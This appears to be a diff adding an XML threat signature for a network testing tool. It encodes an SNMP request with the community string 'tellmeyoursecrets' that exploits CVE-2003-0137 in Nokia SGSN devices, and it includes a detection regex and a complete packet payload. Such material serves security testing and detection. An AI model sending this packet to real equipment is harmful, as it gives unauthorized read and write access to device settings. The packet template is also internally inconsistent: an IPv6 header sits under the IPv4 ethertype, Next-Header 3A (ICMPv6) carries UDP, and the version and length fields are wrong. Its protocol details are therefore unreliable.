@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Nokia SNMP Disclosure of Information (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends an SNMP request with the community string of tellmeyoursecrets.  However, the flaw is that certain versions of the Nokia SGSN will respond to SNMP requests regardless of the community string specified allowing an attacker to read or set SNMP variables without knowing the community string. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="SNMP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Network_Appliance"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Nokia"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Nokia_SGSN"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Nokia_SGSN_DX200"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.atstake.com/research/advisories/2003/a031303-2.txt"/>
+    <CVEID display="true" value="CVE-2003-0137"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="45e3e4288a7a92b9f4eda07e74a6d569"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1211992072"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X30\X31\X02\X01\X00\X04\X11\X74\X65\X6C\X6C\X6D\X65\X79\X6F\X75\X72\X73\X65\X63\X72\X65\X74\X73\XA1\X19\X02\X04\X2F\X59\X9E\XAA\X02\X01\X00\X02\X01\X00\X30\X0B\X30\X09\X06\X05\X2B\X06\X01\X02\X01\X05\X00"/>
+    <Created value="1139462348" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="SNMPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026, 65535)" destPort="$SNMPdestPort" checksum="" length="" Payload="3031020100041174656C6C6D65796F757273656372657473A11902042F599EAA020100020100300B300906052B060102010500"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
